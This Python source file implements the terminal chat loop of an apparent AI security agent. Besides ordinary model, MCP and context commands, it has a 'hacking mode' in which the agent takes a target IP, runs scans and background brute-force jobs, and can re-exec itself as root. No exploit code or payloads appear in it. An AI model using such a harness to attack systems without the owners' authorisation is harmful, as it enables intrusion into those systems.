            ctx_seg = f"   <style fg='#98c379'>ctx {_fmt_ctx(maxc)}{star}</style>"
        return HTML(
            f"  <b>{_model_short(p)}</b>  ·  {p.get('provider', '?')}"
            f"  ·  <i>{p.get('name', '?')}</i>{cap_seg}{ctx_seg}   {mode_seg}   "
            f"{priv_seg}{dbg_seg}{hack_seg}{scan_seg}   <style fg='#7f7f7f'>/exit to quit</style>")

    def toolbar():
        # Never let a transient error building the bar remove it — a raising
        # bottom_toolbar callable makes prompt_toolkit drop the line entirely.
        try:
            return _toolbar_inner()
        except Exception:                             # noqa: BLE001
            return HTML("  <style fg='#7f7f7f'>/exit to quit</style>")

    style = Style.from_dict({
        "prompt":         "bold #d75fff",
        "bottom-toolbar": "#dddddd bg:#1c1c1c",
    })

    # With the slash dropdown open, Enter otherwise just closes the menu; make it
    # submit the typed command directly (unless the user arrowed onto an item).
    kb = KeyBindings()

    @kb.add("enter", filter=has_completions & ~completion_is_selected)
    def _(event):
        event.current_buffer.validate_and_handle()

    # Esc with the menu open: cancel the completion and force a repaint so the
    # rows reserved for the menu are released — otherwise they linger as a gap
    # above the toolbar when you return to the conversation.
    @kb.add("escape", filter=has_completions, eager=True)
    def _(event):
        event.current_buffer.cancel_completion()
        event.app.invalidate()

    session = PromptSession(
        history=PromptHistory(),
        completer=SlashCompleter(
            servers_provider=lambda: [
                (n, bool(s.get("enabled", True)))
                for n, s in mcp.load_config().get("servers", {}).items()
                if not mcp_client.is_builtin_server(s)],
            # /start, /stop, /status are offered only while hacking mode is on.
            extra_provider=lambda: ([("/start", "start hacking the recorded target"),
                                     ("/stop", "stop the agent (pause hacking)"),
                                     ("/status", "show the background scan status")]
                                    if hack_mode else [])),
        # complete_while_typing=False so the menu's reserved rows are claimed only
        # while a completion is actually active — not permanently, which left a big
        # gap above the model toolbar. reserve_space_for_menu is the on-demand
        # height the dropdown grows into (and collapses out of) during completion.
        complete_while_typing=False,
        reserve_space_for_menu=6,
        bottom_toolbar=toolbar,
        key_bindings=kb,
        style=style,
    )

    # Auto-open the slash menu the moment the line looks like a command (starts
    # with "/", no space yet) — so it still pops up as you type, Claude-Code style,
    # without complete_while_typing (which would reserve the space permanently).
    def _autocomplete_slash(buf) -> None:
        text = buf.document.text_before_cursor
        parts = text.split(" ")
        # Trigger on a top-level "/cmd", on a subcommand slot ("/mcp ", "/mcp ad"),
        # or on the "/mcp remove <name>" slot (server-name completion).
        top = text.startswith("/") and len(parts) == 1
        sub = len(parts) == 2 and parts[0].lower() in SLASH_SUBCOMMANDS
        name = (len(parts) == 3 and parts[0].lower() == "/mcp"
                and parts[1].lower() in _MCP_NAME_SUBS)
        if top or sub or name:
            if buf.complete_state is None:
                buf.start_completion(select_first=False)
        elif buf.complete_state is not None:
            buf.cancel_completion()

    session.default_buffer.on_text_changed += _autocomplete_slash

    # The welcome banner is a live, blinking prompt message. It stays on screen
    # (repainted in place) for as long as you only run slash commands — which add
    # nothing to the conversation — and gives way to a plain "❯ " once you send the
    # first real message. Rebuilt on demand so it tracks the current model + greeting.
    hint = ("  \x1b[38;5;244mtype \x1b[36m/\x1b[0m\x1b[38;5;244m for commands · "
            "\x1b[36m/model\x1b[0m\x1b[38;5;244m to pick a model · a message to chat"
            "\x1b[0m\n")

    def build_frames() -> dict:
        return {v: "\n" + _render_ansi(
                    _banner_panel(ctx["profile"], _logo_text(v), greeting,
                                  returning=not first_launch)) + hint
                for v in ("open", "blink", "squint")}

    frames = build_frames()

    def banner_message():
        # On submit, prompt_toolkit freezes the last-rendered frame into the
        # scrollback. Force open eyes on that final (is_done) render so the banner
        # left in history never looks stuck mid-blink/squint.
        try:
            done = get_app().is_done
        except Exception:
            done = False
        now = time.time()
        if done:                                   # final frame kept in history
            eyes = "open"
        elif (now % BLINK_CYCLE) < BLINK_LEN:      # quick blink, often
            eyes = "blink"
        elif (now % SQUINT_CYCLE) < SQUINT_LEN:    # slower squint, now and then
            eyes = "squint"
        else:
            eyes = "open"
        return ANSI(frames[eyes] + "\n❯ ")

    plain_prompt = HTML("<prompt>❯ </prompt>")
    conversation_started = False   # while False, keep the blinking welcome banner
    awaiting_target = False        # /hack: next plain message carries the target info

    while True:
        # Flush any pipeline prints queued by worker threads that run_in_terminal
        # couldn't show live (fallback for the immediate-above-the-prompt output).
        if conversation_started and ctx.get("pending"):
            _flush_pending(ctx)
        try:
            if not conversation_started:
                # Persistent welcome screen: wipe + repaint so a single banner keeps
                # blinking while you only run slash commands (they add nothing to the
                # conversation). Rebuilt each turn to reflect the model / greeting.
                sys.stdout.write("\x1b[2J\x1b[H")
                sys.stdout.flush()
                frames = build_frames()
                text = session.prompt(banner_message,
                                      refresh_interval=BLINK_REFRESH).strip()
            elif awaiting_target:
                # step 1 of /hack: the IP is typed inline, via input() so the prompt
                # is the terminal's default colour (matching step 2), not the violet
                # prompt-toolkit style.
                text = input("  step 1 — enter the target IP: ").strip()
            else:
                # No continuous refresh: the toolbar redraws on each background print
                # (run_in_terminal) and on _invalidate_toolbar when 'thinking' toggles,
                # so the progress tag stays current without a timer racing the prompt
                # erase/redraw (which could drop the bottom bar).
                text = session.prompt(plain_prompt).strip()
        except KeyboardInterrupt:
            continue          # Ctrl-C: clear the line, stay put
        except EOFError:
            break             # Ctrl-D: quit

        if not text:
            continue

        if text.startswith("/"):
            _erase_prompt_line()   # don't leave "❯ /help" cluttering the screen
            cmd = text.split()[0].lower()
            if cmd in ("/exit", "/quit", "/q"):
                break
            elif cmd == "/help":
                print_help()
            elif cmd == "/clear":
                # Clear the model context AND wipe the screen + scrollback, then
                # drop back to the fresh welcome banner — so no trace of the old
                # conversation is left visible or scrollable.
                history.clear()
                ctx.pop("summary", None)               # also drop the condensed summary
                if sys.stdout.isatty():
                    sys.stdout.write("\x1b[3J\x1b[2J\x1b[H")   # scrollback + screen
                    sys.stdout.flush()
                conversation_started = False
            elif cmd == "/model":
                # Re-read from disk so profiles added or edited in the GUI
                # (File ▸ AI Settings ▸ Profiles) show up without restarting.
                config = psai._load_config(base_dir)
                cur = ctx["profile"].get("name") if ctx["profile"] else None
                chosen = pick_model(config, cur, base_dir)
                if chosen is _NO_MODEL:
                    ctx["profile"] = None
                    ctx["max_context"] = None   # drop any /setcontext override
                    _save_state(base_dir, profile=None)
                    console.print("  [yellow]○[/yellow] model detached "
                                  "[dim](no LLM attached)[/dim]")
                elif chosen:
                    ctx["profile"] = chosen
                    ctx["max_context"] = None   # new model → back to its own context
                    _save_state(base_dir, profile=chosen.get("name"))
                    console.print(
                        f"  [green]▸[/green] now using "
                        f"[bold]{_model_short(chosen)}[/bold] "
                        f"[dim]· {chosen.get('provider')}[/dim]")
            elif cmd == "/mode":
                chosen = pick_mode(mode)
                if chosen:
                    mode = chosen
                    _save_state(base_dir, mode=mode)
                    hint = next((h for n, h in AGENT_MODES if n == mode), "")
                    console.print(f"  [green]▸[/green] agent mode: "
                                  f"[bold]{mode}[/bold] [dim]— {hint}[/dim]")
            elif cmd == "/mcp":
                parts = text.split()
                sub = parts[1].lower() if len(parts) > 1 else ""
                if sub == "add":
                    _mcp_add(mcp, base_dir, parts[2:])
                elif sub == "enable":
                    name = parts[2] if len(parts) > 2 else ""
                    if not name:
                        names = [n for n, s in
                                 mcp.load_config().get("servers", {}).items()
                                 if not mcp_client.is_builtin_server(s)
                                 and not s.get("enabled", True)]
                        console.print("  [yellow]usage:[/yellow] /mcp enable <name>"
                                      + (f"  [dim]— disabled: {', '.join(names)}[/dim]"
                                         if names else
                                         "  [dim](no disabled servers)[/dim]"))
                    else:
                        console.print(f"  [dim]enabling {name} — fetching tools…[/dim]")
                        status, info = mcp.enable_server(name)
                        if status == "enabled":
                            console.print(f"  [green]▸[/green] [bold]{name}[/bold] "
                                          "enabled"
                                          + (f" [dim]— {info}[/dim]" if info else ""))
                        elif status == "builtin":
                            console.print(f"  [dim]{name} is built-in — always "
                                          "enabled[/dim]")
                        elif status == "error":
                            console.print(f"  [red]○[/red] couldn't enable "
                                          f"[bold]{name}[/bold] — [dim]{info}[/dim]")
                        else:
                            console.print(f"  [yellow]no such server:[/yellow] {name}")
                elif sub == "disable":
                    name = parts[2] if len(parts) > 2 else ""
                    if not name:
                        names = [n for n, s in
                                 mcp.load_config().get("servers", {}).items()
                                 if not mcp_client.is_builtin_server(s)
                                 and s.get("enabled", True)]
                        console.print("  [yellow]usage:[/yellow] /mcp disable <name>"
                                      + (f"  [dim]— enabled: {', '.join(names)}[/dim]"
                                         if names else
                                         "  [dim](no servers to disable)[/dim]"))
                    else:
                        status = mcp.disable_server(name)
                        if status == "disabled":
                            console.print(f"  [yellow]▸[/yellow] [bold]{name}[/bold] "
                                          "disabled")
                        elif status == "builtin":
                            console.print(f"  [yellow]{name}[/yellow] is built-in "
                                          "[dim]— can't be disabled[/dim]")
                        else:
                            console.print(f"  [yellow]no such server:[/yellow] {name}")
                elif sub in ("remove", "rm", "delete"):
                    name = parts[2] if len(parts) > 2 else ""
                    if not name:
                        names = [n for n, s in
                                 mcp.load_config().get("servers", {}).items()
                                 if not mcp_client.is_builtin_server(s)]
                        if names:
                            console.print("  [yellow]usage:[/yellow] /mcp remove "
                                          "<name>  [dim]— available: "
                                          f"{', '.join(names)}[/dim]")
                        else:
                            console.print("  [dim]no removable MCP servers "
                                          "(built-ins can't be removed)[/dim]")
                    else:
                        status = mcp.remove_server(name)
                        if status == "removed":
                            console.print(f"  [green]▸[/green] removed [bold]{name}"
                                          "[/bold] [dim](and its stored token)[/dim]")
                        elif status == "builtin":
                            console.print(f"  [yellow]{name}[/yellow] is built-in "
                                          "[dim]— can't be removed[/dim]")
                        else:
                            console.print(f"  [yellow]no such server:[/yellow] {name}")
                else:
                    # Spawn stdio servers (local, fast) so they show alive at
                    # once; the live view probes HTTP endpoints in the background.
                    mcp.connect()   # refresh so freshly added/removed servers show
                    tools_ok = bool(ctx["profile"]) and _model_has_tools(
                        ctx["profile"], base_dir)
                    _mcp_view(mcp, tools_ok)
                    mcp.connect()   # reflect enable/disable done inside the view
                # Text subcommands print to the main screen; on the welcome banner
                # the next repaint clears it, so pause to let the message be read.
                if not conversation_started and sub in (
                        "add", "enable", "disable", "remove", "rm", "delete"):
                    _pause_after_command()
            elif cmd == "/doctor":
                mcp.connect()          # ensure the hacktools stdio server is spawned
                _doctor_view(mcp)      # own alt-screen window on a TTY, else inline
            elif cmd == "/hack":
                if hack_mode:
                    # Already on → /hack again offers to turn it off.
                    console.print(Text("  ⚠ disable hacking mode?", style="yellow"))
                    try:
                        ans = input("      disable? [y/N] ").strip().lower()
                    except (EOFError, KeyboardInterrupt):
                        ans = ""
                    if ans in ("y", "yes"):
                        _cancel_engagement(ctx)      # stop any running scans
                        hack_mode = False
                        hack_goal = None
                        awaiting_target = False
                        ctx["hacking"] = False
                        console.print("  [yellow]▸[/yellow] hacking mode "
                                      "[bold]off[/bold]")
                    else:
                        console.print(Text("      cancelled", style="bright_black"))
                else:
                    msg, goal = _run_hack(ctx, base_dir, history, mcp, debug)
                    if msg:
                        hack_mode = True          # lights up the toolbar
                        hack_goal = goal          # objective shortcode on the toolbar
                        awaiting_target = True     # next plain message is the target
                        # End the welcome banner: otherwise the next turn clears the
                        # screen (\x1b[2J) and wipes the intro we just printed.
                        conversation_started = True
            elif cmd == "/memory":
                parts = text.split()
                sub = parts[1].lower() if len(parts) > 1 else ""
                if sub in ("delete", "del", "rm", "remove"):
                    if len(parts) > 2 and parts[2].isdigit():
                        gone = _delete_memory_index(base_dir, int(parts[2]))
                        if gone:
                            console.print(Text("  ▸ forgot: ", style="yellow").append(
                                gone, style="bright_black"))
                        else:
                            console.print("  [yellow]no memory entry with that "
                                          "number[/yellow] [dim]— see /memory[/dim]")
                    else:
                        console.print("  [yellow]usage:[/yellow] /memory delete <number> "
                                      " [dim](numbers from /memory)[/dim]")
                elif sub == "clear":
                    n = _clear_memories(base_dir)
                    console.print(f"  [yellow]▸[/yellow] cleared {n} memory item(s)")
                else:
                    _memory_view(base_dir)
                if not conversation_started:
                    _pause_after_command()
            elif cmd == "/target":
                # Deleting the last target in /target re-arms the target-IP prompt
                # (only meaningful while hacking mode is on).
                if _db_view(base_dir) and hack_mode:
                    awaiting_target = True       # prompt shows "step 1 — enter the target IP:"
                    conversation_started = True
            elif cmd == "/start":
                # Only meaningful in hacking mode with a recorded target — this is
                # how you begin after answering 'n' at the intake to fix data first.
                if not hack_mode:
                    console.print("  [yellow]/start[/yellow] is only available in "
                                  "hacking mode [dim]— enable it with[/dim] "
                                  "[cyan]/hack[/cyan]")
                elif awaiting_target:
                    console.print("  [yellow]enter the target IP first[/yellow] "
                                  "[dim]before starting[/dim]")
                elif not purragent_db.fetch_hosts(base_dir):
                    console.print("  [yellow]no target recorded yet[/yellow] "
                                  "[dim]— re-run[/dim] [cyan]/hack[/cyan]")
                else:
                    _start_hacking(ctx, base_dir, hack_goal)
            elif cmd == "/status":
                _status_view(ctx)
            elif cmd == "/stop":
                # Interrupt whatever the agent is running (kills the scan) and pause
                # the engagement so you can chat / fix data before resuming.
                if not hack_mode:
                    console.print("  [yellow]/stop[/yellow] is only available in "
                                  "hacking mode")
                elif not ctx.get("hacking"):
                    if _brute_running(ctx):          # run auto-stopped, brute still going
                        _cancel_engagement(ctx, include_background=True)
                        console.print(Text("  ▸ aborted the background brute-force "
                                           "job(s).", style="yellow"))
                    else:
                        console.print("  [dim]already stopped — "
                                      "[/dim][cyan]/start[/cyan][dim] to resume[/dim]")
                else:
                    # include background so /stop during the run also kills any brute
                    _cancel_engagement(ctx, include_background=True)
                    ctx["hacking"] = False
                    stop = Text("  ▸ stopped the agent. ", style="yellow")
                    stop.append("/start", style="cyan")
                    stop.append(" to resume, ", style="bright_black")
                    stop.append("/target", style="cyan")
                    stop.append(" to change the target.", style="bright_black")
                    console.print(stop)
            elif cmd == "/upgrade":
                elevate()   # re-exec as root (replaces the process on success)
            elif cmd == "/debug":
                debug = not debug
                # Flip psai's flag so BOTH paths dump: the plain text chat (via
                # psai's streamers) and the agent tool loop (via _chat_stream).
                psai._DEBUG_PROMPT = debug
                if debug:
                    console.print(
                        "  [green]▸[/green] debug [bold]on[/bold] "
                        "[dim]— dumps each request (messages + tools, key "
                        "masked) before the reply[/dim]")
                else:
                    console.print("  [yellow]▸[/yellow] debug [bold]off[/bold]")
            elif cmd == "/context":
                _context_view(ctx, base_dir, history, mcp, mode, debug=debug)
            elif cmd == "/setcontext":
                arg = text[len("/setcontext"):].strip()
                if not arg:
                    maxc = _effective_max_context(ctx, base_dir)
                    cur = f"{maxc:,}" if maxc else "unknown"
                    console.print(f"  [dim]current max context:[/dim] "
                                  f"[bold]{cur}[/bold]  [dim]usage: /setcontext "
                                  "<number>  (e.g. 32000 or 32k, or 'default')[/dim]")
                elif arg.lower() in ("default", "reset", "auto", "model"):
                    ctx["max_context"] = None       # drop the override → model default
                    maxc = _effective_max_context(ctx, base_dir)
                    cur = f"{maxc:,}" if maxc else "unknown"
                    console.print(f"  [green]▸[/green] max context reset to the model "
                                  f"default [bold]{cur}[/bold]")
                else:
                    n = _parse_ctx_number(arg)
                    if not n:
                        console.print("  [yellow]invalid number.[/yellow] "
                                      "[dim]e.g. /setcontext 32000, 128k, or "
                                      "'default'[/dim]")
                    else:
                        ctx["max_context"] = n
                        console.print(f"  [green]▸[/green] max context set to "
                                      f"[bold]{n:,}[/bold] tokens "
                                      "[dim](this session only)[/dim]")
            elif cmd == "/greeting":
                name = text[len("/greeting"):].strip()
                if not name:
                    console.print(f"  [dim]current greeting:[/dim] "
                                  f"[bold]Welcome back {greeting}![/bold]  "
                                  "[dim]usage: /greeting <name>[/dim]")
                else:
                    greeting = name
                    _save_state(base_dir, greeting=greeting)
                    console.print(f"  [green]▸[/green] greeting set — "
                                  f"[bold]Welcome back {greeting}![/bold] "
                                  "[dim](updates the banner)[/dim]")
            else:
                console.print(f"  [yellow]unknown command:[/yellow] {cmd}  "
                              "[dim](/help for the list)[/dim]")
            continue

        # /hack step 1: the next normal chat message is the target IP. Validate it —
        # on success print SKELETON OK and stop awaiting; on an invalid IP keep
        # awaiting so the user re-enters. Not added to the chat history.
        if awaiting_target:
            conversation_started = True
            if _record_target(ctx, base_dir, debug, text, hack_goal):
                awaiting_target = False
            continue

        # `btw <question>` (hacking mode): a tool-free side question to the model,
        # with the target database injected as context. Works even while the agent
        # is actively hacking — btw is the side-channel meanwhile.
        if hack_mode and text.split(" ", 1)[0].lower() == "btw":
            conversation_started = True
            q = text.split(" ", 1)[1].strip() if " " in text else ""
            if q:
                _btw_chat(ctx, base_dir, q)
            else:
                console.print("  [dim]usage:[/dim] btw <question>")
            continue

        # While the agent is actively hacking, a plain message would collide with the
        # engagement — steer the user to /stop (pause + chat) or /target. `btw` above
        # still works for quick questions.
        if hack_mode and ctx.get("hacking"):
            conversation_started = True
            msg = Text("  agent is hacking · ", style="bright_black")
            msg.append("/stop", style="cyan")
            msg.append(" or ", style="bright_black")
            msg.append("/target", style="cyan")
            msg.append(" to interact · ", style="bright_black")
            msg.append("btw", style="cyan")
            msg.append(" to ask", style="bright_black")
            console.print(msg)
            continue

        # Plain message → query the attached model (needs one selected first).
        # Re-read the attached profile from disk first, so edits made in the GUI
        # (hide_thinking, temperature, key, url, custom_system…) take effect
        # without restarting — the profile is matched by name.
        if ctx["profile"]:
            fresh = _find_profile(psai._load_config(base_dir),
                                  ctx["profile"].get("name", ""))
            if fresh is None:
                # Renamed or removed in AI Settings — detach with a note.
                ctx["profile"] = None
                ctx["max_context"] = None
                console.print("  [yellow]○[/yellow] the attached model profile is "
                              "gone [dim](renamed or removed in AI Settings) — type "
                              "[/dim][cyan]/model[/cyan][dim] to pick one[/dim]")
            else:
                ctx["profile"] = fresh
        if not ctx["profile"]:
            console.print("  [yellow]No model selected.[/yellow] Type "
                          "[cyan]/model[/cyan] to choose one first.")
            continue

        conversation_started = True   # first real message ends the welcome screen
        history.append({"role": "user", "content": text})

        # Offer MCP tools only when the model can actually call functions and the
        # provider speaks the OpenAI tool format; otherwise use the plain text path.
        use_tools = (_supports_tool_loop(ctx["profile"])
                     and _model_has_tools(ctx["profile"], base_dir))
        if use_tools:
            ensure_mcp()
            # Keep the verbatim history within its % budget: condense the oldest turns
            # that overflow into ctx['summary'] (dropping them from history).
            _maybe_summarize(ctx["profile"], base_dir, ctx, mcp, mode, history)

        # Pre-flight guard: if the request would STILL overflow the model's window after
        # summarisation (a too-small /setcontext, or one giant turn), don't send it — a
        # blown window truncates or errors mid-generation. Warn and point at /context
        # and /setcontext.
        maxc = _effective_max_context(ctx, base_dir)
        if maxc:
            est = _estimate_context_tokens(ctx["profile"], base_dir, history,
                                           mcp, use_tools)
            if est > maxc:
                history.pop()          # drop the blocked turn so history stays clean
                over = est - maxc
                console.print(
                    f"  [red]▸ context exceeded[/red] — this prompt needs about "
                    f"[bold]{est:,}[/bold] tokens but the window is "
                    f"[bold]{maxc:,}[/bold] [dim](over by ~{over:,}).[/dim]\n"
                    f"    [dim]Nothing was sent. Check [/dim][cyan]/context[/cyan]"
                    f"[dim], raise it with [/dim][cyan]/setcontext <n>[/cyan]"
                    f"[dim], or shorten the conversation.[/dim]")
                continue

        # Accumulate streamed text (and an interrupted flag) at this scope so the
        # post-turn guard can close the turn coherently even on Ctrl-C.
        streamed_text: list = []
        interrupted = False
        tool_spin = {"obj": None}
        # Set by the tool loop if the model calls enable_hacking_mode(enable=true);
        # a mutable holder because a closure can't rebind run_repl's locals.
        hack_signal = {"requested": False}

        def _on_hack():
            hack_signal["requested"] = True

        def _stop_tool_spin():
            if tool_spin["obj"] is not None:
                tool_spin["obj"].stop()
                tool_spin["obj"] = None

        def _on_text(piece):
            streamed_text.append(piece)
            sys.stdout.write(piece)
            sys.stdout.flush()

        try:
            if use_tools and mcp.has_tools():
                def _on_tool(kind, name, payload):
                    if not debug:
                        # Concise (Claude-Code-style): one line per call — the tool
                        # name plus a short preview of its main argument, clipped to
                        # fit the terminal width on a single line.
                        if kind == "search":
                            _stop_tool_spin()
                            grey = "bright_black"
                            hits = ", ".join(payload.get("hits") or []) or "no match"
                            need = " ".join(str(name).split())
                            line = Text("  🔍 finding tool  ", style=grey)
                            cols = shutil.get_terminal_size((80, 24)).columns
                            room = max(12, cols - len(line) - len(hits) - 6)
                            if len(need) > room:
                                need = need[:room - 1] + "…"
                            line.append(f"{need}", style=grey)
                            line.append(f"  → {hits}", style=grey)
                            console.print(line)
                            return
                        if kind == "call":
                            _srv, short = mcp_client.split_namespaced(name)
                            # Grey the whole line so tool activity stays ambient and
                            # the model's answer / user's prompt read as primary.
                            # bright_black is the theme's grey palette slot (ANSI 8) —
                            # visibly distinct from the default fg AND theme-adaptive,
                            # unlike `dim`, which some terminals render like normal text.
                            grey = "bright_black"
                            line = Text(f"  ⚙ running tool {short}", style=grey)
                            preview = _tool_arg_preview(payload)
                            if preview:
                                cols = shutil.get_terminal_size((80, 24)).columns
                                room = max(12, cols - len(line) - 3)
                                if len(preview) > room:
                                    preview = preview[:room - 1] + "…"
                                line.append(f"  {preview}", style=grey)
                            console.print(line)
                            tool_spin["obj"] = _ToolSpinner().start()   # await result
                            return
                        if kind == "result":
                            _stop_tool_spin()
                            glyph, gstyle, label = _tool_status(payload)
                            status = Text("    ⎿ ", style="bright_black")
                            status.append(glyph, style=gstyle)
                            status.append(f" {label}", style="bright_black")
                            console.print(status)
                        return
                    # Debug: verbose — show arguments and the tool's result.
                    if kind == "search":
                        hits = ", ".join(payload.get("hits") or []) or "(no match)"
                        console.print(f"  [{VIOLET}]🔍 request_tool[/{VIOLET}] "
                                      f"[dim]need={name!r}[/dim] → [dim]{hits}[/dim]")
                    elif kind == "call":
                        args = json.dumps(payload, ensure_ascii=False)
                        console.print(f"  [{VIOLET}]⚙ {name}[/{VIOLET}] "
                                      f"[dim]{args}[/dim]")
                    else:
                        out = (payload.get("text") or "").replace("\n", " ")
                        if len(out) > 200:
                            out = out[:200] + "…"
                        mark = "red" if payload.get("is_error") else "green"
                        console.print(f"    [{mark}]→[/{mark}] [dim]{out}[/dim]")

                # The answer is streamed live via _on_text (defined above).
                reply = query_model_with_tools(ctx["profile"], base_dir, history,
                                               mcp, _on_tool, _on_text,
                                               mode=mode, on_confirm=_confirm_action,
                                               offer_hack=not hack_mode,
                                               on_hack=_on_hack,
                                               summary=ctx.get("summary", ""))
                _stop_tool_spin()          # defensive: never leave one animating
                if streamed_text:
                    sys.stdout.write("\n")
                    sys.stdout.flush()
                if hack_signal["requested"] and not hack_mode:
                    # Model proposed hacking mode. Discard its detour reply and run
                    # the exact same flow as /hack (confirm + objective + announce).
                    msg, goal = _run_hack(ctx, base_dir, history, mcp, debug)
                    if msg:
                        hack_mode = True
                        hack_goal = goal
                        awaiting_target = True
                        conversation_started = True
                        # Close the user's turn: the announcement is its answer.
                        history.append({"role": "assistant", "content": msg})
                    else:
                        # Declined → the model may have misfired, abandoning the real
                        # request. Re-answer the same query with the hack tool off so
                        # it responds normally instead of leaving the task dangling.
                        console.print(Text("  ↻ answering without hacking mode",
                                           style="bright_black"))
                        reply = query_model_with_tools(
                            ctx["profile"], base_dir, history, mcp, _on_tool,
                            _on_text, mode=mode, on_confirm=_confirm_action,
                            offer_hack=False, summary=ctx.get("summary", ""))
                        _stop_tool_spin()
                        if streamed_text:
                            sys.stdout.write("\n")
                            sys.stdout.flush()
                        if reply:
                            history.append({"role": "assistant", "content": reply})
                elif reply:
                    # Already streamed to screen — just keep it for context.
                    history.append({"role": "assistant", "content": reply})
            else:
                reply = query_model(ctx["profile"], base_dir, history)
                if reply:
                    history.append({"role": "assistant", "content": reply})
        except (KeyboardInterrupt, SystemExit):
            # psai's streamers sys.exit(130) on Ctrl-C mid-reply; stay in the REPL.
            _stop_tool_spin()          # clear the spinner if we broke mid tool call
            interrupted = True
            console.print("\n  [dim]interrupted[/dim]")

        # Keep the transcript well-formed: a user turn left without an assistant
        # reply (e.g. Ctrl-C mid-generation) makes the model continue the *previous*
        # question on the next prompt — and loop when tools are involved. Always
        # close the turn with an assistant message (the partial text if we have it).
        if history and history[-1].get("role") == "user":
            partial = "".join(streamed_text).strip()
            note = "[interrupted]" if interrupted else "[no response]"
            history.append({"role": "assistant",
                            "content": f"{partial}\n\n{note}" if partial else note})

    mcp.close()   # shut down any MCP server subprocesses we spawned
    purragent_db.reset(base_dir)   # wipe the session's engagement store (credentials)
    console.print("  [dim]bye[/dim]")


# ── Entry ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(prog="purragent", add_help=True)
    parser.add_argument("--base-dir", default=None)
    args = parser.parse_args()

    base_dir = args.base_dir or os.path.dirname(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

    config = psai._load_config(base_dir)

    if not _profiles(config):
        console.print(
            "  [yellow]No API profiles configured.[/yellow]\n"
            "  Open [bold]AI Settings ▸ API Providers[/bold] and add a model first.")
        sys.exit(1)

    # Resolve the attached profile from the saved selection. On first launch
    # there is none — we do NOT auto-open the picker; the banner tells the user
    # to type /model, and they choose when they want to.
    state   = _load_state(base_dir)
    profile = _find_profile(config, state.get("profile", ""))

    run_repl(base_dir, config, profile)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.exit(130)
